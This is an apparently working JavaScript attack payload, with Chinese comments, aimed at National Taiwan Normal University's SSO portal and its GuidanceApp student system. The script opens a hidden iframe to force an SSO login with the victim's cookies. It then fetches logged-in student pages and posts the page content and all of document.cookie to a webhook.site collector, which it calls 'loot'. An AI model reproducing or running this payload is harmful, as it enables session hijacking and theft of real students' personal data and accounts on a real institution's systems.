(async () => {
    // === 設定區域 ===
    // 你的 Webhook 接收地址
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // SSO 入口 (位於 iportal2，用於觸發登入)
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    
    // 攻擊目標 (位於 ap.itc，登入後才有權限訪問)
    // 建議先試試看這個登入檢查點，或者你可以換成首頁 "/GuidanceApp/index.do"
    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
    // const targetUrl = "/GuidanceApp/student/studentInfo.do"; // 備用目標

    // === 攻擊邏輯 ===
    try {
        // 1. 創建隱藏的子 Iframe (Level 3)
        // 這會利用瀏覽器自動攜帶 iportal2 Cookie 的特性，完成 SSO 流程
        // 並將新的 ap.itc Session Cookie 寫入瀏覽器
        const ifr = document.createElement('iframe');
        ifr.style.display = 'none';
        ifr.src = ssoUrl;
        document.body.appendChild(ifr);

        // 回報狀態：開始攻擊
        fetch(webhook + "?step=1_triggering_sso");

        // 2. 等待 SSO 流程完成
        // 這需要一點時間讓子 iframe 載入、執行 JS、POST、重導向
        // 設定 5 秒應該足夠，如果網路慢可以設久一點
        await new Promise(resolve => setTimeout(resolve, 5000));

        // 3. 嘗試讀取目標資料 (Level 2 - 自身環境)
        // 此時 Session 應該已經建立，且因為我們在 ap.itc 同源環境，可以直接 fetch
        const response = await fetch(targetUrl);
        const content = await response.text();

        // 4. 回傳戰果
        const loot = {
            msg: "Attack Completed",
            current_origin: window.location.origin,
            target_url: targetUrl,
            status_code: response.status,
            // 抓取部分內容預覽 (避免過長)
            html_preview: content.substring(0, 2000),
            // 所有的 Cookie (包含剛剛 SSO 拿到的新 Session)
            cookies: document.cookie
        };

        await fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(loot)
        });

        // 5. (可選) 清理現場
        // document.body.removeChild(ifr); 
        // 建議不要太快移除，以免流程還沒跑完，或者為了保持 Session 活躍

    } catch (e) {
        // 錯誤處理
        fetch(webhook + "?error=" + encodeURIComponent(e.message));
    }
})();